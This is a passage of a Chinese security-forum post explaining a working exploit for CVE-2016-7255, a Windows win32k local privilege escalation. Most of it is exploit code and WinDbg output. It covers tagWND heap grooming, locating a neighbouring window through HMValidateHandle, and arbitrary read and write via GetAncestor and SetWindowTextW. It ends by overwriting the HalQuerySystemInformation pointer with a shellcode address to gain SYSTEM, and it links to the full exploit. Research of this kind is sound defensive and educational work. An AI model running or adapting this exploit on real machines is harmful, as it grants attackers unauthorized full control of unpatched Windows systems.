
可以看到此时成功将`cbwndExtra`值扩大到`0x04000000`：

```
kd> dd 0xFEA1C290

fea1c290  04000000 fea1c200 000701d5 00000000

fea1c2a0  00000000 00000000 00000000 00000058

fea1c2b0  00010004 08000017 00000002 00000002

fea1c2c0  013663a0 0000a918 ffa83308 0001c033

fea1c2d0  00010017 08000004 000a01c0 00000003

fea1c2e0  ffa72dd8 877cd140 fea1c2d8 60040408

fea1c2f0  80000700 20080900 14c00000 00400000

fea1c300  00000000 fea1c128 fea1c488 fea00618
```

## 3.内存布局

现在可以利用漏洞实现扩大`cbwndExtra`成员的方式来实现越界写入，需要在被扩大的`tagWND`对象的可写入的范围内布置另一个`tagWND`结构体作为用来修改的窗口对象，通过对该对象成员的修改实现任意地址读写，所以此时需要首先创建一部分窗口，在释放掉其中的一部分，这样触发漏洞的时候创建的窗口之后就会存在另一个`tagWND`对象，相应代码如下：

```
BOOL Init_CVE_2016_7255(HWND *hWndList)

{

	BOOL bRet = TRUE;

	CONST DWORD dwFakeNum = 100;

	WNDCLASSEX wc = { 0 };

	char *pFakeName = "Fake";

	DWORD i = 0;

	

	memset(&wc, 0, sizeof(wc));

	wc.cbSize = sizeof(wc);

	wc.hInstance = GetModuleHandle(NULL);

	wc.lpfnWndProc = DefWindowProc;

	wc.lpszClassName = pFakeName;



	if (!RegisterClassEx(&wc))

	{

		ShowError("RegisterClassEx", GetLastError());

		bRet = FALSE;

		goto exit;

	}



	// 创建用来攻击的窗口

	for (i = 0; i < dwFakeNum; i++)

	{

		hWndList[i] = CreateWindowEx(NULL,

									 pFakeName,

									 "Hack",

									 WS_VISIBLE,

									 0, 0, 100, 100,

									 NULL,

									 0,

									 GetModuleHandle(NULL),

									 0);

		if (!hWndList[i])

		{

			ShowError("CreateWindowEx", GetLastError());

			bRet = FALSE;

			goto exit;

		}

	}



	// 释放其中的一部分用来保存触发漏洞时候创建的窗口

	for (i = 20; i < 80; i += 2)

	{

		if (!DestroyWindow(hWndList[i]))

		{

			ShowError("DestroyWindow", GetLastError());

			bRet = FALSE;

			goto exit;

		}

		hWndList[i] = NULL;

	}

	

exit:

	return bRet;

}
```

此时，在触发漏洞的时候，加入以下代码用来查找位于被扩大`cbwndExtra`的`tagWND`对象高地址中最近的一个`tagWND`对象用来作为攻击窗口此时，就可以利用越界写入修改攻击窗口对象`tagWND`中的成员。

```
DWORD dwTriggerAddr = 0, dwAttackAddr = 0;

lHMValidateHandle HMValidateHandle =  (lHMValidateHandle)GetHMValidateHandle();



PTHRDESKHEAD pTriggerHead = (PTHRDESKHEAD)HMValidateHandle(hTriggerWnd, TYPE_WINDOW);



dwTriggerAddr = (DWORD)pTriggerHead->pSelf;

// 寻找用来攻击的tagWND

for (i = 0; i < 100; i++)

{

	if (hWndList[i])

	{

		PTHRDESKHEAD pFakeHead = (PTHRDESKHEAD)HMValidateHandle(hWndList[i], TYPE_WINDOW);



		dwAttackAddr = (DWORD)pFakeHead->pSelf;

		if (dwAttackAddr > dwTriggerAddr && dwAttackAddr - dwTriggerAddr < 0x3FD000)

		{

			hAttackWnd = hWndList[i];

			break;

		}

	}

}



if (!hAttackWnd)

{

	printf("Do not find Attack tagWND\n");

	bRet = FALSE;

	goto exit;

}
```

## 4.任意地址读写

任意地址的读取要用到`GetAncestor`函数，该函数的定义如下：

```
HWND GetAncestor(HWND hwnd, UINT gaFlags);
```

该函数会调用内核中的`NtUserGetAncestor`，`NtUserGetAncestor`函数将`_GetAncestor`函数返回值指向的地址中的值作为返回值：

![](https://bbs.kanxue.com/upload/attach/202206/835440_PH6CRZH7SUU9TYV.jpg)

参数`gaFlags`为`1`的时候，`_GetAncestor`函数会返回`tagWND`中偏移`0x34`的`spwndParent`：

![](https://bbs.kanxue.com/upload/attach/202206/835440_8BE5SE7HAHSEJFS.jpg)

所以，在用户层调用`GetAncestor`函数的时候，如果第二个参数指定为`GA_PARENT`，函数就会将第一个参数对应的`tagWND`对象的`spwndParant`所指的内存地址中的数据返回。

```
#define     GA_PARENT       1
```

因为可以利用越界写入操作将`tagWND`偏移`0x34`的`spwndParent`修改为任意地址，所以，可以通过调用`GetAncestor`就可以实现任意地址的读取。

对于任意地址写入，需要用到`tagWND`对象偏移`0x84`处的`strName`成员：

```
kd> dt win32k!tagWND

   +0x084 strName          : _LARGE_UNICODE_STRING
```

该成员用来是一个`_LARGE_UNICODE_STRING`结构体，结构体定义如下：

```
2: kd> dt win32k!_LARGE_UNICODE_STRING

   +0x000 Length           : Uint4B

   +0x004 MaximumLength    : Bitfield Pos 0, 31 Bits

   +0x004 bAnsi            : Bitfield Pos 31, 1 Bit

   +0x008 Buffer           : Ptr32 to Uint2B
```

在用户层调用如下定义的`SetWindowTextW`函数的时候，函数会将参数`lpString`中的数据写入到`tagWND->strName`的`Buffer`保存的地址中。同理，因为此时可以利用越界写入操作将`Buffer`修改为任意地址，所以，可以通过`SetWindowTextW`实现任意地址写入。

```
WINUSERAPI

BOOL

WINAPI

SetWindowTextW(

    __in HWND hWnd,

    __in_opt LPCWSTR lpString);
```

有了任意地址的读写能力，现在就可以轻松地通过修改`NtQuerySystemInformation`函数来实现提权操作，相应代码如下：

```
BOOL EnablePrivilege_CVE_2016_7255(HWND hTriggerWnd, HWND hAttackWnd, DWORD dwOffset)

{

	BOOL bRet = TRUE;

	

	PVOID pTargetAddr = NULL;

	// 获取目标函数地址

	pTargetAddr = GetHalQuerySystemInformation();



	if (!pTargetAddr)

	{

		bRet = FALSE;

		goto exit;

	}



	DWORD dwOrg = 0, dwOrgPar = 0;

	DWORD dwParentOffset = dwOffset + 0x34;



	// 获取原tagWND->spwndParent

	dwOrgPar = GetWindowLong(hTriggerWnd, dwParentOffset);

	

	// 设置tagWND->spwndParent为目标函数地址

	SetWindowLong(hTriggerWnd, dwParentOffset, (ULONG)pTargetAddr);



	// 获取目标函数地址中的原来的内容

	dwOrg = (DWORD)GetAncestor(hAttackWnd, GA_PARENT);



	// 恢复tagWND->spwndParent

	SetWindowLong(hTriggerWnd, dwParentOffset, dwOrgPar);



	DWORD dwBufOffset = dwOffset + 0x84 + 0x8;

	 

	// 修改tagWND->StrName->Buffer为目标函数地址

	SetWindowLong(hTriggerWnd, dwBufOffset, (ULONG)pTargetAddr);

	

	// 设置目标函数地址为ShellCode地址

	WCHAR wBuf[3] = { 0 };



	*(PDWORD)wBuf = (DWORD)ShellCode_CVE_2016_7255;

	if (!SetWindowTextW(hAttackWnd, wBuf))

	{

		ShowError("SetWindowText", GetLastError());

		bRet = FALSE;

		goto exit;

	}



	// 调用函数实现提权

	if (!CallNtQueryIntervalProfile())

	{

		bRet = FALSE;

		goto exit;

	}



	// 恢复目标函数地址

	*(PDWORD)wBuf = dwOrg;

	if (!SetWindowTextW(hAttackWnd, wBuf))

	{

		ShowError("SetWindowText", GetLastError());

		bRet = FALSE;

		goto exit;

	}

	

exit:

	return bRet;

}
```

# 四.运行结果

完整代码在：[**7b4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5$3i4K6u0V1y4K6t1#2y4g2)9J5k6h3y4H3M7l9`.`.**](https://bbs.kanxue.com/elink@4fcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5$3i4K6u0V1y4K6t1#2y4g2)9J5k6h3y4H3M7l9`.`.)。编译运行`exp`就可以成功实现提权操作：

![](https://bbs.kanxue.com/upload/attach/202206/835440_VXF3VDPMZB349QA.jpg)

# 五.参考资料

- [**2feK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4o6p5J5y4e0t1#2x3U0m8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5I4z5e0j5&6z5o6b7$3y4b7`.`.**](https://bbs.kanxue.com/elink@db9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4o6p5J5y4e0t1#2x3U0m8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5I4z5e0j5&6z5o6b7$3y4b7`.`.)

- [**https://bbs.pediy.com/thread-272761.htm**](https://bbs.pediy.com/thread-272761.htm)

- [**be9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3#2x3U0x3J5**](https://bbs.kanxue.com/elink@329K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3#2x3U0x3J5)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-6-29 15:27

被1900编辑，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
